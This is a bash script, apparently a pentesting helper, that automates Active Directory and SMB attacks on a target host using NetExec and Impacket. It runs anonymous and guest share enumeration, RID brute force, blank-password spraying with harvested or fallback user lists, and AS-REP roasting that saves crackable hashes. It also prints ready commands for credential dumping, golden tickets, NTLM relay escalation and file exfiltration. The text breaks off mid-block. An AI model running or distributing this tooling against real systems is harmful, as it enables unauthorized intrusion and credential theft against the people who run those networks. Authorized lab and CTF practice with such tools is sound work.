#!/bin/bash

# Default values
IP=""
user=""
pass=""
domain=""
hash=""
os_type="windows"  # Default to Windows

# --- Color Definitions & ADHD Friendly Output ---
NC='\033[0m'
BOLD='\033[1m'
UNDERLINE='\033[4m'
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'

# Bright Colors
BRED='\033[1;31m'
BGREEN='\033[1;32m'
BYELLOW='\033[1;33m'
BBLUE='\033[1;34m'
BMAGENTA='\033[1;35m'
BCYAN='\033[1;36m'
BWHITE='\033[1;37m'

# Standardized Logging Functions
log_info() {
    echo -e "${BCYAN}ℹ️  [*] $1${NC}"
}

log_success() {
    echo -e "${BGREEN}✅ [+] $1${NC}"
}

log_warning() {
    echo -e "${BYELLOW}⚠️  [!] $1${NC}"
}

log_error() {
    echo -e "${BRED}❌ [-] $1${NC}"
}

log_cmd() {
    echo -e "${BMAGENTA}🚀 [>] $1${NC}"
}

log_section() {
    echo -e "\n${BBLUE}━━━━━━━━━━━━━━━ ${BWHITE}${BOLD}$1${BBLUE} ━━━━━━━━━━━━━━━${NC}"
}

# Banner
print_banner() {
    echo -e "${BCYAN}${BOLD}"
    echo "  _  ___   _______        _         _   "
    echo " | \| \ \ / / ____|      / \  _   _| |_ ___  "
    echo " |  \` |\ V /| |         / _ \| | | | __/ _ \ "
    echo " | |  |/   \| |___     / ___ \ |_| | || (_) |"
    echo " |_| _/_/ \_\_____|   /_/   \_\__,_|\__\___/ "
    echo "                                            "
    echo -e "${BMAGENTA}       Automated Enumeration Script${NC}"
    echo -e "${BBLUE}       NetExec Power-Up | ADHD Friendly Edition${NC}\n"
}

# Function to display help
usage() {
    print_banner
    echo -e "${BWHITE}${BOLD}Usage:${NC} $0 -i IP [-u USER] [-p PASSWORD] [-d DOMAIN] [-H HASH] [-o OS]"
    echo ""
    echo -e "${BCYAN}Options:${NC}"
    echo "  -i  Target IP address (required)"
    echo "  -u  Username"
    echo "  -p  Password"
    echo "  -d  Domain"
    echo "  -H  NTLM Hash"
    echo "  -o  Target OS type: 'w' or 'windows' (default), 'l' or 'linux'"
    echo "  -h  Show this help message"
    echo ""
    echo -e "${BYELLOW}${BOLD}IMPORTANT:${NC} Always quote passwords and usernames with special characters!"
    echo "  Example: $0 -i 10.0.0.1 -u 'Administrator' -p 'P@\$\$W0rd'"
    exit 1
}

# Parse arguments
while getopts "i:u:p:d:H:o:h" opt; do
    case $opt in
        i) IP="$OPTARG" ;;
        u) user="$OPTARG" ;;
        p) pass="$OPTARG" ;;
        d) domain="$OPTARG" ;;
        H) hash="$OPTARG" ;;
        o) 
            case "${OPTARG,,}" in  # Convert to lowercase
                w|windows) os_type="windows" ;;
                l|linux) os_type="linux" ;;
                *) log_error "Invalid OS type. Use 'w/windows' or 'l/linux'"; usage ;;
            esac
            ;;
        h) usage ;;
        *) usage ;;
    esac
done

# Check if IP is set
if [ -z "$IP" ]; then
    log_error "IP address is required."
    usage
fi

print_banner

# Function to check if a port is open (uses bash /dev/tcp)
check_port() {
    target_ip=$1
    target_port=$2
    service_name=$3
    
    # Skip check if we don't know the IP (shouldn't happen)
    if [ -z "$target_ip" ]; then return 0; fi

    # Use bash built-in TCP connection for reliability (avoids nc version/flag issues)
    # Timeout set to 10 seconds
    (timeout 10 bash -c "</dev/tcp/$target_ip/$target_port") &>/dev/null
    result=$?

    if [ $result -eq 0 ]; then
        return 0 # Port is open
    else
        if [ -n "$service_name" ]; then
             log_warning "Skipping $service_name checks (Port $target_port seems closed)"
        fi
        return 1 # Port is closed
    fi
}

# Helper function to print command and separators
print_cmd() {
    echo -e "\n${BBLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}" >&2
    log_cmd "Executing: $*" >&2
    echo -e "${BBLUE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}\n" >&2
}


log_section "Target Configuration"
log_info "Target OS Type: ${BWHITE}$os_type${NC}"
log_info "Logging Enabled: ${BWHITE}$(pwd)/nxc-enum${NC}"

# Warning about quoting passwords
if [ -n "$pass" ]; then
    log_warning "REMINDER: If your password contains special characters (\$ ! * etc.),"
    log_warning "make sure you quoted it properly: -p 'P@\$\$W0rd'"
fi

mkdir -p nxc-enum nxc-enum/smb nxc-enum/ldap

# Check for nxc database schema issues and auto-fix
check_nxc_db() {
    if command -v nxc &> /dev/null; then
        # Run a quick check against localhost to trigger potential DB errors
        check_out=$(nxc smb 127.0.0.1 --timeout 1 2>&1)
        if echo "$check_out" | grep -q "Schema mismatch detected"; then
             log_warning "NXC DB Schema mismatch detected during self-check. Auto-fixing..."
             # Try deleting DBs for both current user and root (if running as root)
             rm -f ~/.nxc/workspaces/default/*.db 2>/dev/null
             rm -f /root/.nxc/workspaces/default/*.db 2>/dev/null
             log_success "Database files removed. NetExec will re-initialize them on the next run."
        fi
    fi
}
check_nxc_db

# Check for unbuffer command and stub it if missing
if ! command -v unbuffer &> /dev/null; then
    log_warning "'unbuffer' (part of 'expect' package) is not installed."
    log_info "Output might not be captured in real-time. Continuing anyway..."
    unbuffer() { "$@"; }
fi

VALID_CREDS_FILE="nxc-enum/valid_credentials.txt"
> "$VALID_CREDS_FILE"
POTENTIAL_CREDS_FILE="nxc-enum/potential_credentials.txt"
> "$POTENTIAL_CREDS_FILE"

# Function to promote a working credential to the primary user
promote_verified_creds() {
    if [ -s "$VALID_CREDS_FILE" ] && { [ -f "$user" ] || [ -z "$user" ] || [ "$HAS_PROMOTED" != "true" ]; }; then
        # Pick the first one (usually the one nxc found first)
        local best_cred=$(head -n 1 "$VALID_CREDS_FILE")
        local disc_domain=""
        local remainder=""
        local disc_user=""
        local disc_secret=""
        
        if [[ "$best_cred" == *"\\"* ]]; then
            disc_domain=$(echo "$best_cred" | cut -d'\' -f1)
            remainder=$(echo "$best_cred" | cut -d'\' -f2-)
        else
            remainder="$best_cred"
        fi
        
        disc_user=$(echo "$remainder" | cut -d: -f1)
        disc_secret=$(echo "$remainder" | cut -d: -f2-)
        
        # Don't promote if it's the same as what we already have (unless we had a file)
        [ "$user" == "$disc_user" ] && [ ! -f "$user" ] && return
        
        log_success "Found valid credentials: ${BWHITE}$best_cred${NC}"
        log_info "Promoting '${BWHITE}$disc_user${NC}' as primary user for deep-dive enumeration..."
        
        # Update globals
        [ -n "$disc_domain" ] && domain="$disc_domain"
        user="$disc_user"
        
        # Determine if hash or password
        if [[ "$disc_secret" =~ ^[0-9a-fA-F]{32}$ ]] || [[ "$disc_secret" =~ ^[0-9a-fA-F]{32}:[0-9a-fA-F]{32}$ ]]; then
            hash="$disc_secret"
            pass=""
        else
            pass="$disc_secret"
            hash=""
        fi
        
        # Re-build flags
        if [ -n "$domain" ]; then DOMAIN_FLAG="-d $domain"; else DOMAIN_FLAG=""; fi
        if [ -n "$hash" ]; then
            USER_FLAG="-u $user -H $hash"
            RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
            SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
            RPCDUMP_ARG="-u $user -hashes :$hash -d $domain"
        elif [ -n "$pass" ]; then
            USER_FLAG="-u $user -p $pass"
            RPC_ARG="-U $domain\\\\$user%$pass"
            SECRETS_ARG="$domain/$user:$pass@$IP"
            RPCDUMP_ARG="-u $user -p $pass -d $domain"
        fi
        
        HAS_PROMOTED="true"
        log_info "Flags updated. Subsequent checks will use '${BWHITE}$user${NC}' credentials."
    fi
}

# Show Impacket tools suggestions if credentials provided
if [ -n "$user" ] && { [ -n "$pass" ] || [ -n "$hash" ]; }; then
    log_section "Impacket Tools - Quick Reference"
    echo ""
    
    # Build credential string
    if [ -n "$hash" ]; then
        cred_string="$user -hashes :$hash"
    else
        cred_string="$user:$pass"
    fi
    
    if [ -n "$domain" ]; then
        target="$domain/$cred_string@$IP"
        target_simple="$domain/$user@$IP"
    else
        target="$cred_string@$IP"
        target_simple="$user@$IP"
    fi
    
    echo -e "${BCYAN}# 1. Credential Dumping:${NC}"
    echo "impacket-secretsdump $target                    # Dump SAM/LSA/NTDS"
    echo "impacket-secretsdump -just-dc $target           # Only NTDS (faster)"
    echo "impacket-secretsdump -just-dc-ntlm $target      # Only NTLM hashes"
    echo ""
    
    echo -e "${BCYAN}# 2. Remote Command Execution:${NC}"
    echo "impacket-psexec $target                         # Execute via Service Manager"
    echo "impacket-wmiexec $target                        # Execute via WMI"
    echo "impacket-smbexec $target                        # Execute via SMB"
    echo "impacket-dcomexec $target                       # Execute via DCOM"
    echo "impacket-atexec $target 'whoami'                # Execute via Task Scheduler"
    if [ -n "$hash" ]; then
        echo "evil-winrm -i $IP -u $user -H $hash          # Execute via WinRM (Hash)"
    else
        echo "evil-winrm -i $IP -u $user -p '$pass'        # Execute via WinRM (Pass)"
    fi
    echo ""
    
    echo -e "${BCYAN}# 3. Kerberos Attacks:${NC}"
    if [ -n "$domain" ]; then
        echo "impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass -dc-ip $IP  # AS-REP roasting"
        echo "impacket-GetUserSPNs $target -dc-ip $IP -request                       # Kerberoasting"
        echo "impacket-getTGT $domain/$cred_string -dc-ip $IP                        # Request TGT"
        echo "impacket-getST $domain/$cred_string -spn cifs/$IP -dc-ip $IP           # Request Service Ticket"
    else
        echo "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP"
        echo "impacket-GetUserSPNs DOMAIN/$cred_string@$IP -dc-ip $IP -request"
        echo "impacket-getTGT DOMAIN/$cred_string -dc-ip $IP"
    fi
    echo ""
    
    echo -e "${BCYAN}# 4. SMB/File Operations:${NC}"
    echo "impacket-smbclient $target                      # Interactive SMB client"
    echo "impacket-smbserver share \$(pwd) -smb2support    # Start SMB server (for file transfer)"
    echo "impacket-lookupsid $target                      # Enumerate users via SID"
    echo "impacket-reg $target query -keyName HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion  # Query registry"
    echo ""
    
    echo -e "${BCYAN}# 5. LDAP/AD Enumeration:${NC}"
    echo "impacket-GetADUsers $target -all -dc-ip $IP     # Dump all AD users"
    echo "impacket-GetADComputers $target -all -dc-ip $IP # Dump all computers"
    echo "impacket-dacledit $target -action read -principal Administrator -dc-ip $IP  # Read ACLs"
    echo "impacket-findDelegation $target -dc-ip $IP      # Find delegation"
    echo ""
    
    echo -e "${BCYAN}# 6. MSSQL Attacks:${NC}"
    echo "impacket-mssqlclient $target                    # Interactive MSSQL client"
    echo "impacket-mssqlclient $target -windows-auth      # Windows authentication"
    echo ""
    
    echo -e "${BCYAN}# 7. Network Attacks:${NC}"
    echo "impacket-ntlmrelayx -tf targets.txt -smb2support                    # NTLM relay"
    echo "impacket-ntlmrelayx -t ldap://$IP --escalate-user $user             # LDAP relay + escalation"
    echo "impacket-rpcdump $IP                                                # Enumerate RPC endpoints"
    echo "impacket-samrdump $target                                           # Dump SAM via RPC"
    echo ""
    
    echo -e "${BCYAN}# 8. Ticket Manipulation (if you have tickets):${NC}"
    echo "impacket-ticketConverter ticket.kirbi ticket.ccache                 # Convert ticket format"
    echo "impacket-ticketer -nthash <hash> -domain-sid <sid> -domain $domain Administrator  # Golden ticket"
    echo ""
    
    echo -e "${BCYAN}# 9. Other Useful Tools:${NC}"
    echo "impacket-addcomputer $target -computer-name 'EVILPC$' -computer-pass 'Password123'  # Add computer account"
    echo "impacket-exchanger $target -ah $IP                                  # Exchange exploitation"
    echo "impacket-netview $target                                            # Network enumeration"
    echo "impacket-services $target list                                      # List services"
    echo ""
    
    log_warning "Replace DOMAIN with actual domain name if not provided"
    log_info "For full list: ls /usr/share/doc/python3-impacket/examples/"
    echo ""
else
    # Show anonymous Impacket tools when no credentials
    log_section "Impacket Tools - Anonymous Enumeration"
    echo ""
    echo -e "${BCYAN}# 1. User Enumeration (no credentials needed):${NC}"
    echo "impacket-lookupsid -no-pass anonymous@$IP                           # Enumerate users via SID"
    echo "impacket-samrdump $IP                                               # Dump SAM via RPC (anonymous)"
    if [ -n "$domain" ]; then
        echo "impacket-GetNPUsers $domain/ -usersfile users.txt -no-pass -dc-ip $IP  # AS-REP roasting (no creds)"
    else
        echo "impacket-GetNPUsers DOMAIN/ -usersfile users.txt -no-pass -dc-ip $IP   # AS-REP roasting (no creds)"
    fi
    echo ""
    echo -e "${BCYAN}# 2. Network Enumeration:${NC}"
    echo "impacket-rpcdump $IP                                                # Enumerate RPC endpoints"
    echo "impacket-netview $IP                                                # Network enumeration"
    echo ""
    echo -e "${BCYAN}# 3. SMB Enumeration (try anonymous):${NC}"
    echo "impacket-smbclient -no-pass anonymous@$IP                           # Try anonymous SMB access"
    echo ""
    echo -e "${BCYAN}# 4. NTLM Relay (capture credentials):${NC}"
    echo "impacket-ntlmrelayx -tf targets.txt -smb2support                    # NTLM relay attack"
    echo "impacket-ntlmrelayx -t ldap://$IP -smb2support                      # Relay to LDAP"
    echo ""
    echo -e "${BCYAN}# 5. Start SMB server (for file exfiltration):${NC}"
    echo "impacket-smbserver share \$(pwd) -smb2support                        # Start SMB server"
    echo ""
    log_warning "Many tools work better with credentials. Run with -u and -p flags."
    log_info "For full list: ls /usr/share/doc/python3-impacket/examples/"
    echo ""
fi

log_section "OS Info & LDAP SID"
# checks if the SMB service is running; returns OS info, name, domain, SMB versions

# Skip Windows-specific LDAP/AD checks for Linux targets
if [ "$os_type" = "windows" ]; then
    # Helper: Check SMB port (445) first
    if ! check_port $IP 445 "SMB/LDAP"; then
        log_warning "Port 445 closed. Enumeration might fail."
        # We don't exit, just warn, in case of firewalls or non-standard ports
    fi

    # LDAP domain SID (requires credentials)
    if [ -n "$user" ]; then
        print_cmd "nxc ldap $IP $USER_FLAG --get-sid --users"
        unbuffer nxc ldap $IP $USER_FLAG --get-sid --users | tee nxc-enum/ldap/domain-sid.txt
    else
        log_info "Skipping LDAP domain SID (no credentials supplied)"
    fi
else
    log_info "Skipping Windows-specific LDAP/AD checks (target OS: Linux)"
fi

# Skip Windows-specific anonymous/guest enumeration for Linux
if [ "$os_type" = "windows" ]; then
    # Guest access (domain optional)
    log_section "SMB Guest Access"
    if [ -n "$domain" ]; then
        print_cmd "nxc smb $IP -d \"$domain\" -u 'guest' -p '' --shares"
        guest_output=$(nxc smb $IP -d "$domain" -u 'guest' -p '' --shares)
    else
        print_cmd "nxc smb $IP -u 'guest' -p '' --shares"
        guest_output=$(nxc smb $IP -u 'guest' -p '' --shares)
    fi
    echo "$guest_output"
    
    # Check if guest access succeeded and suggest commands
    if echo "$guest_output" | grep -q "\[+\]" && ! echo "$guest_output" | grep -q "Error enumerating shares"; then
        # Check if we actually have accessible shares
        has_shares=false
        echo "$guest_output" | while read -r line; do
            clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
            if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                has_shares=true
                break
            fi
        done
        
        if echo "$guest_output" | grep -qE "READ|WRITE"; then
            log_success "Guest SMB access successful! Suggested commands:"
            echo "rpcclient -U 'guest%' $IP"
            echo ""
            
            # Suggest specific shares if found
            log_info "Connect to shares:"
            echo "$guest_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                    share=${share#\\}
                    if [ ! -z "$share" ]; then
                        echo "smbclient -U 'guest%' //$IP/$share"
                    fi
                fi
            done
            echo ""
            
            # Suggest recursive download commands
            log_info "Download all files recursively:"
            echo "$guest_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                    share=${share#\\}
                    if [ ! -z "$share" ] && [[ "$share" != "IPC$" ]]; then
                        echo "smbclient //$IP/$share -U 'guest%' -c 'prompt OFF;recurse ON;mget *'"
                        echo "# Or with smbget: smbget -R //$IP/$share -U guest%"
                    fi
                fi
            done
            echo ""
        fi
    fi
    
    # Anonymous access (domain optional)
    log_section "SMB Anonymous Access"
    if [ -n "$domain" ]; then
        print_cmd "nxc smb $IP -d \"$domain\" -u '' -p '' --shares"
        anon_output=$(nxc smb $IP -d "$domain" -u '' -p '' --shares)
    else
        print_cmd "nxc smb $IP -u '' -p '' --shares"
        anon_output=$(nxc smb $IP -u '' -p '' --shares)
    fi
    echo "$anon_output"
    
    # Check if anonymous access succeeded and suggest commands
    if echo "$anon_output" | grep -q "\[+\]" && ! echo "$anon_output" | grep -q "Error enumerating shares"; then
        if echo "$anon_output" | grep -qE "READ|WRITE"; then
            log_success "Anonymous SMB access successful! Suggested commands:"
            echo "rpcclient -U '' -N $IP"
            echo ""
            
            # Suggest specific shares if found
            log_info "Connect to shares:"
            echo "$anon_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                    share=${share#\\}
                    if [ ! -z "$share" ]; then
                        echo "smbclient -U '' -N //$IP/$share"
                    fi
                fi
            done
            echo ""
            
            # Suggest recursive download commands
            log_info "Download all files recursively:"
            echo "$anon_output" | while read -r line; do
                clean_line=$(echo "$line" | sed 's/\x1b\[[0-9;]*m//g')
                if [[ "$clean_line" == *"READ"* ]] || [[ "$clean_line" == *"WRITE"* ]]; then
                    share=$(echo "$clean_line" | awk '{for(i=1;i<=NF;i++) if($i=="READ" || $i=="WRITE") print $(i-1)}')
                    share=${share#\\}
                    if [ ! -z "$share" ] && [[ "$share" != "IPC$" ]]; then
                        echo "smbclient //$IP/$share -N -c 'prompt OFF;recurse ON;mget *'"
                        echo "# Or with smbget: smbget -R //$IP/$share -U %"
                    fi
                fi
            done
            echo ""
        fi
    fi
    
    # --- Auto-Domain Discovery ---
    if [ -z "$domain" ]; then
        # Try to extract DNS domain (priority) or NetBIOS domain from nxc output
        discovered_domain=$(echo "$guest_output $anon_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
        
        if [ -n "$discovered_domain" ]; then
            domain="$discovered_domain"
            DOMAIN_FLAG="-d $domain"
            log_success "Auto-discovered domain: ${BWHITE}$domain${NC}"
            log_info "Updating flags for subsequent scans (LDAP, RDP, WinRM)..."
            
            # Re-build RPC/SECRETS arguments that rely on domain
            if [ -n "$user" ]; then
                if [ -n "$hash" ]; then
                    RPC_ARG="-U $domain\\\\$user --pw-nt-hash $hash"
                    SECRETS_ARG="-hashes :$hash $domain/$user@$IP"
                elif [ -n "$pass" ]; then
                    RPC_ARG="-U $domain\\\\$user%$pass"
                    SECRETS_ARG="$domain/$user:$pass@$IP"
                fi
            fi
        fi
    fi
    # ----------------------------
else
    log_info "Skipping Windows-specific Guest/Anonymous SMB checks (target OS: Linux)"
fi

# Skip Windows-specific anonymous RPC/AD enumeration for Linux UNLESS SMB is open (Samba)
# Modified to allow check on Linux if port 445/139 is open
if [ "$os_type" = "windows" ] || check_port $IP 445 || check_port $IP 139; then
    log_section "RPC User Enumeration (lookupsid)"
    log_info "Attempting anonymous SID bruteforce to enumerate users..."
    # Try anonymous first
    # Try impacket-lookupsid first
    print_cmd "impacket-lookupsid -no-pass anonymous@$IP"
    lookupsid_output=$(timeout 30s impacket-lookupsid -no-pass anonymous@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-anonymous.txt)
    # Fallback to lookupsid.py if failed
    if [ ! -s nxc-enum/smb/lookupsid-anonymous.txt ]; then
        print_cmd "lookupsid.py -no-pass anonymous@$IP"
        lookupsid_output=$(timeout 30s lookupsid.py -no-pass anonymous@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-anonymous.txt)
    fi
    
    # If anonymous failed to find users, try guest
    if ! echo "$lookupsid_output" | grep -q "SidTypeUser"; then
        log_warning "Anonymous lookupsid failed, trying with 'guest' account..."
        print_cmd "impacket-lookupsid -no-pass guest@$IP"
        lookupsid_output=$(timeout 30s impacket-lookupsid -no-pass guest@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-guest.txt)
        if [ ! -s nxc-enum/smb/lookupsid-guest.txt ]; then
            print_cmd "lookupsid.py -no-pass guest@$IP"
            lookupsid_output=$(timeout 30s lookupsid.py -no-pass guest@$IP 2>/dev/null | tee nxc-enum/smb/lookupsid-guest.txt)
        fi
        if echo "$lookupsid_output" | grep -q "SidTypeUser"; then
             log_success "Successfully enumerated users via 'guest' account!"
             # combine outputs for parsing later
             cat nxc-enum/smb/lookupsid-guest.txt >> nxc-enum/smb/lookupsid-anonymous.txt
        fi
    fi
    echo "$lookupsid_output"
    
    # Check if lookupsid found users
    if echo "$lookupsid_output" | grep -q "SidTypeUser\|SidTypeGroup"; then
        log_success "Successfully enumerated users/groups via RPC!"
        log_info "Results saved to: ${BWHITE}nxc-enum/smb/lookupsid-anonymous.txt${NC}"
        echo ""
        
        # Automatically extract and save usernames
        timestamp=$(date +%Y%m%d_%H%M%S)
        users_file="nxc-enum/smb/users_${timestamp}.txt"
        grep 'SidTypeUser' nxc-enum/smb/lookupsid-anonymous.txt | awk -F'\\' '{print $2}' | awk '{print $1}' | grep -v '\$$' > "$users_file"
        
        log_success "Extracted usernames saved to: ${BWHITE}$users_file${NC}"
        log_info "Found ${BGREEN}$(wc -l < "$users_file")${NC} users (excluding machine accounts)"
        echo ""
        log_info "View users:"
        echo "cat $users_file"
        echo ""
        log_info "Use for password spraying:"
        echo "nxc smb $IP -u $users_file -p 'Password123' --continue-on-success"
        echo ""
        
        # Try alternative enumeration tools if lookupsid didn't find users
    else
        log_warning "lookupsid.py didn't find users, trying alternative tools..."
    fi
    
    # Alternative Tool 1: NetExec RID Brute (anonymous & guest)
    log_section "NetExec RID Brute"
    log_info "Trying NetExec RID Brute (anonymous)"
    print_cmd "nxc smb $IP -u '' -p '' --rid-brute"
    nxc_rid_output=$(timeout 60s nxc smb $IP -u '' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-anonymous.txt)
    echo "$nxc_rid_output"

    log_info "Trying NetExec RID Brute (guest)"
    if [ -n "$domain" ]; then
        print_cmd "nxc smb $IP -d \"$domain\" -u 'guest' -p '' --rid-brute"
        nxc_rid_guest_output=$(timeout 60s nxc smb $IP -d "$domain" -u 'guest' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-guest.txt)
    else
        print_cmd "nxc smb $IP -u 'guest' -p '' --rid-brute"
        nxc_rid_guest_output=$(timeout 60s nxc smb $IP -u 'guest' -p '' --rid-brute 2>/dev/null | tee nxc-enum/smb/nxc-rid-guest.txt)
    fi
    echo "$nxc_rid_guest_output"
    
    # Alternative Tool 2: rpcclient enumdomusers
    log_section "rpcclient Enumeration"
    log_info "Trying rpcclient enumdomusers (anonymous)"
    print_cmd "rpcclient -U '' -N $IP -c 'enumdomusers'"
    rpcclient_output=$(rpcclient -U '' -N $IP -c 'enumdomusers' 2>/dev/null | tee nxc-enum/smb/rpcclient-enumdomusers.txt)
    echo "$rpcclient_output"
    
    # Alternative Tool 3: samrdump
    log_section "samrdump Enumeration"
    log_info "Trying samrdump (anonymous)"
    print_cmd "impacket-samrdump $IP"
    samrdump_output=$(timeout 15s impacket-samrdump $IP 2>/dev/null | tee nxc-enum/smb/samrdump-anonymous.txt)
    if [ ! -s nxc-enum/smb/samrdump-anonymous.txt ]; then
         print_cmd "samrdump.py $IP"
         samrdump_output=$(timeout 15s samrdump.py $IP 2>/dev/null | tee nxc-enum/smb/samrdump-anonymous.txt)
    fi
    echo "$samrdump_output"
    
    # Alternative Tool 4: enum4linux (if installed)
    if command -v enum4linux &> /dev/null; then
        log_section "enum4linux Enumeration"
        log_info "Trying enum4linux (anonymous)"
        print_cmd "enum4linux -U $IP"
        timeout 30s enum4linux -U $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-users.txt
    fi

    # Alternative Tool 5: enum4linux-ng (if installed)
    if command -v enum4linux-ng &> /dev/null; then
        log_section "enum4linux-ng Enumeration"
        log_info "Trying enum4linux-ng (anonymous - MAX INFO)"
        # -A (All), -R (RID Cycle), -d (Detailed)
        print_cmd "enum4linux-ng -A -R -d $IP"
        timeout 600s enum4linux-ng -A -R -d $IP 2>/dev/null | tee nxc-enum/smb/enum4linux-ng-anonymous.txt
    fi
    
    # Check if we got users from any tool and create users file if not already created
    users_file_count=$(ls nxc-enum/smb/users_*.txt 2>/dev/null | wc -l)
    if [ "$users_file_count" -eq 0 ]; then
        # Try to extract from alternative tools
        timestamp=$(date +%Y%m%d_%H%M%S)
        users_file="nxc-enum/smb/users_${timestamp}.txt"
        
        # Try nxc output
        if echo "$nxc_rid_output" | grep -q "SidTypeUser"; then
            echo "$nxc_rid_output" | grep "SidTypeUser" | awk -F'\\\\' '{print $2}' | awk '{print $1}' | grep -v '\$$' >> "$users_file"
        fi
        
        if echo "$nxc_rid_guest_output" | grep -q "SidTypeUser"; then
            echo "$nxc_rid_guest_output" | grep "SidTypeUser" | awk -F'\\\\' '{print $2}' | awk '{print $1}' | grep -v '\$$' >> "$users_file"
        fi
        
        # Try rpcclient output
        if [ ! -s "$users_file" ] && echo "$rpcclient_output" | grep -q "user:"; then
            echo "$rpcclient_output" | grep "user:" | awk -F'[][]' '{print $2}' > "$users_file"
        fi
        
        # If we got users, show them
        if [ -s "$users_file" ]; then
            log_success "Extracted usernames from alternative tools: ${BWHITE}$users_file${NC}"
            log_info "Found ${BGREEN}$(wc -l < "$users_file")${NC} users"
        fi
    else
        # Users file already exists from lookupsid
        users_file=$(ls -t nxc-enum/smb/users_*.txt 2>/dev/null | head -n1)
    fi

    # Fallback to common usernames if NO users were discovered via any method
    if [ -z "$user" ] && { [ ! -s "$users_file" ] || [ -z "$users_file" ]; }; then
        log_warning "No users discovered via anonymous enumeration. Falling back to common service accounts..."
        timestamp=$(date +%Y%m%d_%H%M%S)
        users_file="nxc-enum/smb/users_fallback_${timestamp}.txt"
        printf "Administrator\nGuest\nbitbucket\njenkins\ngitlab\nsvc_sql\nsvc_domain\nadmin\nuser\n" > "$users_file"
        log_info "Created fallback user list: ${BWHITE}$users_file${NC}"
    fi

    # Auto-adopt discovered users if no user argument was provided
    if [ -z "$user" ] && [ -n "$users_file" ] && [ -s "$users_file" ]; then
        log_success "Auto-adopting discovered username list for further checks..."
        # Convert to absolute path to avoid any cd issues
        user=$(readlink -f "$users_file")
        
        # Re-build flags with the new user list
        if [ -n "$domain" ]; then DOMAIN_FLAG="-d $domain"; else DOMAIN_FLAG=""; fi
        
        # If password was provided, utilize it (Spray), otherwise default to empty (Blank Spray)
        if [ -n "$pass" ]; then
             USER_FLAG="-u $user -p $pass"
        else
             USER_FLAG="-u $user -p ''"
        fi
        log_info "User flag updated to: ${BWHITE}$USER_FLAG${NC}"
        log_warning "Note: This will attempt authentication with the extracted user list."
    fi
    
    # Continue with AS-REP roasting if we have a users file
    if [ -n "$users_file" ] && [ -s "$users_file" ]; then
        
        # AS-REP Roasting with GetNPUsers.py
        log_section "AS-REP Roasting"
        
        # Try to get domain name
        if [ -n "$domain" ]; then
            domain_name="$domain"
        else
            # Try to extract from guest output first
            domain_name=$(echo "$guest_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
            
            # If not found, try anonymous output
            if [ -z "$domain_name" ]; then
                domain_name=$(echo "$anon_output" | grep -oP '(?<=domain:)[^\)]+' | head -n1 | tr -d ' ')
            fi
            
            # If still not found, try lookupsid output
            if [ -z "$domain_name" ]; then
                domain_name=$(echo "$lookupsid_output" | grep -oP 'VULNNET-RST|[A-Z]+-[A-Z]+' | head -n1)
            fi
        fi
        
        if [ -n "$domain_name" ] && [ "$domain_name" != "DOMAIN" ]; then
            log_info "Using domain: ${BWHITE}$domain_name${NC}"
            print_cmd "impacket-GetNPUsers \"${domain_name}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
            getnpusers_output=$(impacket-GetNPUsers "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null | tee nxc-enum/smb/asrep-getnpusers.txt)
            if [ -z "$getnpusers_output" ]; then
                print_cmd "GetNPUsers.py \"${domain_name}/\" -usersfile \"$users_file\" -no-pass -dc-ip $IP"
                getnpusers_output=$(GetNPUsers.py "${domain_name}/" -usersfile "$users_file" -no-pass -dc-ip $IP 2>/dev/null | tee nxc-enum/smb/asrep-getnpusers.txt)
            fi
            echo "$getnpusers_output"
            
            # Check if any AS-REP roastable users were found
            if echo "$getnpusers_output" | grep -q '\$krb5asrep\$'; then
                # Extract just the hashes to a clean file
                grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt > nxc-enum/smb/asrep-hashes.txt
                
                # Extract vulnerable usernames
                vulnerable_users=$(grep '\$krb5asrep\$' nxc-enum/smb/asrep-getnpusers.txt | grep -oP '\$krb5asrep\$23\$\K[^@]+' | tr '\n' ', ' | sed 's/,$//')
                
                log_success "AS-REP Roastable users found: ${BRED}$vulnerable_users${NC}"
